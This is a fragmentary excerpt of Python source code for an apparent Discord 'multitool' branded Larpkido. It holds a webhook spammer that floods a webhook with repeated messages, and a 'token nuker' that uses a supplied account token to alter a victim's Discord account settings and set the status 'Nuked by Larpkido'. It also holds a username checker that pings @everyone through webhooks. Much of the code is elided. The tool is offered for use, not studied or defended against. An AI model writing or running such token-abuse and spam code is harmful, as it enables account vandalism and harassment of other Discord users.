...
#                  |_|                       
# 
# Larpkido Multitool - Developed by Larpkido
# Discord: https://discord.gg/larpkido
...
def webhook_spam(url, msg, amt=10):
    cl = Theme.get_colors()
    print("\n  [+] Initializing spam...") 
    sc, p = 0, {"content": msg, "username": "Larpkido@Multitool", "avatar_url": "https://i.ibb.co/Wv94YGVx/larpkido.png"}
    for i in range(amt):
        st = _snd(url, p)
        if st in [200, 204]:
...
def token_nuker(tk):
    ...
    def _run():
        ...
        time.sleep(1)
        print(Colorate.Horizontal(cl["head"], "\n  [ PHASE 4 ] Finalizing..."))
        _req("PATCH", "https://discord.com/api/v9/users/@me/settings", {"theme": "light", "locale": "ja", "custom_status": {"text": "Nuked by Larpkido"}}, "Set Final White/JP Mode")
...
def discord_username_checker():
    ...
    while True:
        ...
        choice = get_inpt("larpkido@username_checker:~# ").strip()
        ...
        if choice == "1":
            ...
            def send_webhook(username):
                ...
                payload = {
                    "content": "@everyone",
                    "username": "Larpkido",
                    "avatar_url": "https://i.ibb.co/Wv94YGVx/larpkido.png",
                    "embeds": [{
                        ...
                        "thumbnail": {"url": "https://i.ibb.co/Wv94YGVx/larpkido.png"},
                        "footer": {
                            "text": "Larpkido Multitool • https://discord.gg/larpkido",
                            "icon_url": "https://i.ibb.co/Wv94YGVx/larpkido.png"
                        },
                    }]
                }
                with webhook_lock:
